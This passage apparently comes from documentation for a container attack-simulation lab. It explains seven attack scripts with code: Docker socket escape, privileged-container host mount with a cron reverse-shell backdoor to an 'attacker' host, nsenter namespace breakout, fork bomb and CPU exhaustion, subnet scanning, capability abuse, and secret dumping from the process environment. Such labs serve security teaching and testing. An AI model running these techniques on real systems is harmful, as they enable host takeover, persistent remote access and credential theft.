...
5. [Attack Simulations: Code and Mechanics](#5-attack-simulations-code-and-mechanics)
...
The core of the simulation platform is driven by the 7 autonomous Python scripts located in the `attacks/` directory of the `attack-orchestrator`. Below is a technical breakdown of how each script executes the exploit, complete with code snippets demonstrating the underlying container primitives.

### 1. Docker Socket Escape (`1_docker_socket_escape.py`)
This script exploits the inappropriately mounted `/var/run/docker.sock` in the `vulnerable-web` target. It connects directly to the Docker API from inside the container to spawn a new, highly privileged container that mounts the underlying host filesystem.
```python
# Creates a Docker client connected to the mounted Unix socket
client = docker.DockerClient(base_url='unix://var/run/docker.sock')

# Spawns an alpine container, mounting the root host filesystem (/) into the container (/host)
container = client.containers.run(
    'alpine:latest',
    command='chroot /host bash -c "whoami && uname -a"',
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True,
    detach=False
)
```
*Mechanic:* By gaining access to the Docker daemon, the script bypasses all container isolation, achieving arbitrary code execution on the host OS as root via `chroot`.

### 2. Privileged Container Escape (`2_privileged_container_escape.py`)
This attack specifically targets the `privileged-container` target, which runs with `--privileged=true`. The script demonstrates how bypassing AppArmor/SELinux and dropping seccomp filtering allows direct host manipulation.
```bash
# Mounts the host's physical disk device into the container
mkdir -p /mnt/host_root && mount /dev/sda1 /mnt/host_root

# Drops a malicious payload into the host's cron directory for persistence
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' > /mnt/host_root/etc/cron.d/backdoor
```
*Mechanic:* A privileged container has access to all host devices in `/dev`. The script mounts the primary disk partition (`/dev/sda1`) and modifies host OS files (e.g., cron jobs) directly.

### 3. Namespace Manipulation (`3_namespace_manipulation.py`)
Containers rely on Linux Namespaces (PID, Mount, Network, IPC, UTS, User) for isolation. This script breaks namespace boundaries to inspect host processes or pivot to other environments.
```python
# Attempt to utilize nsenter to execute a shell in the host's init process (PID 1) namespace
subprocess.run("nsenter -t 1 -m -u -n -i sh", shell=True)

# Inspect host processes by reading /proc/1/root (if accessible)
subprocess.run("ls -la /proc/1/root/ | head -10", shell=True)
```
*Mechanic:* Tools like `nsenter` and `unshare` are used to jump into different namespaces. If the container lacks proper isolation (e.g., sharing the host PID namespace), an attacker can interact with host processes directly.

### 4. Resource Abuse (`4_resource_abuse.py`)
This attack causes a Denial of Service (DoS) by exploiting misconfigured or absent `cgroups` (Control Groups), which govern resource allocation.
```python
# Fork bomb attack: rapidly exhaust the PID namespace
for i in range(50):
    subprocess.Popen(['sleep', '30'], stdout=subprocess.DEVNULL)

# CPU exhaustion attack: max out CPU cycles across all available cores
def cpu_burn():
    end_time = time.time() + 5
    while time.time() < end_time: _ = sum(range(1000000))
```
*Mechanic:* Without memory limits (`/sys/fs/cgroup/memory/memory.limit_in_bytes`) or PID limits (`/sys/fs/cgroup/pids/pids.max`), an attacker can spawn infinite processes or allocate massive byte arrays until the host kernel invokes the OOM (Out Of Memory) killer.

### 5. Container Network Attacks (`5_container_network_attacks.py`)
This script demonstrates Lateral Movement (T1046) by mapping the isolated container network and actively scanning adjacent services.
```python
# Discovering the network topology from within the container
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

# Scanning for common vulnerable ports (80, 5000, 5432) across the subnet
for ip in subnet_ips:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip, port))
    if result == 0:
        print(f"Service active at {ip}:{port}")
```
*Mechanic:* Containers on the same bridge network can communicate natively. This script probes `vulnerable-web`, `vulnerable-api`, and `vulnerable-db` to find unauthenticated endpoints or plaintext SQL connections.

### 6. Capability Abuse (`6_capability_abuse.py`)
By default, Docker drops dangerous Linux capabilities. This script identifies and exploits overly permissive containers (like `vulnerable-web` running with `CAP_SYS_ADMIN`).
```bash
# Exploiting CAP_SYS_ADMIN to mount tmpfs or overlay filesystems
mount -t tmpfs tmpfs /mnt
```
*Mechanic:* Checking `/proc/self/status` reveals the capability mask. If `CAP_SYS_ADMIN` or `CAP_MAC_ADMIN` are present, the script abuses them to modify mount namespaces or bypass file restrictions.

### 7. Image and Registry Attacks (`7_image_registry_attacks.py`)
This attack simulates a Supply Chain compromise (T1525), specifically targeting the build and deployment pipeline.
```bash
# Finding plaintext credentials or tokens left in the environment variables
cat /proc/self/environ | tr '\0' '\n' | grep -i 'password\|secret\|token'
```
*Mechanic:* Developers often mistakenly bake secrets into Dockerfiles (`ENV PASSWORD=xyz`) or docker-compose manifests. This script extracts the environment variables exposed to the container at runtime to dump API keys, database URLs, and registry credentials.
